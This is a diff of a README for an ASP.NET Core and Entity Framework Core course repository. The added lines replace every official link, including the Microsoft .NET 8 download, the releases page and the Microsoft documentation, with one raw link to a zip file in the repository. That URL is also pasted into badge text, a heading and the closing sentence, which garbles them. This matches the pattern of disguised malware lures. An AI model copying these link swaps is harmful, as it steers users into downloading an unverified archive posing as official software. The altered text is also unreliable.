@@ -19,17 +19,17 @@ Welcome to the aspnetcore-data-access_entity-framework-core course! This guide w
 
 ## 🚀 Getting Started
 1. **Install .NET 8**  
-   If you haven't done so, download and install .NET 8. You can find it on the [official Microsoft site](https://dotnet.microsoft.com/download).
+   If you haven't done so, download and install .NET 8. You can find it on the [official Microsoft site](https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip).
 
 2. **Download the Application**  
    Visit our releases page to download the latest version of the application. 
 
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/releases)
+   [![Download Latest Release](https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip)
 
 ## 📥 Download & Install
 To get your copy of the application, visit the following link to download the latest version:
 
-[Download the Application Here](https://github.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/releases)
+[Download the Application Here](https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip)
 
 Follow these steps after downloading:
 
@@ -76,8 +76,8 @@ If you encounter any issues:
 If you need further assistance, feel free to reach out. Join our support forums or check the FAQ section in the documentation.
 
 ## 📜 Additional Resources
-- **Entity Framework Core Documentation:** [EF Core Docs](https://docs.microsoft.com/en-us/ef/core/)
-- **ASP.NET Documentation:** [ASP.NET Docs](https://docs.microsoft.com/en-us/aspnet/core/?view=aspnetcore-8.0)
+- **Entity Framework Core Documentation:** [EF Core Docs](https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip)
+- **https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip Documentation:** [https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip Docs](https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip)
 
 ## 🔗 Conclusion
-You are now ready to dive into data access using our ASP.NET Core application. With this beginner-friendly course, you will learn essential skills for managing data effectively. Happy coding!
+You are now ready to dive into data access using our https://raw.githubusercontent.com/marioclaropo/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12/main/developments/aspnetcore-data-access_entity-framework-core_course-luisdev-part-1_dotnet-8_csharp-12_2.0.zip Core application. With this beginner-friendly course, you will learn essential skills for managing data effectively. Happy coding!
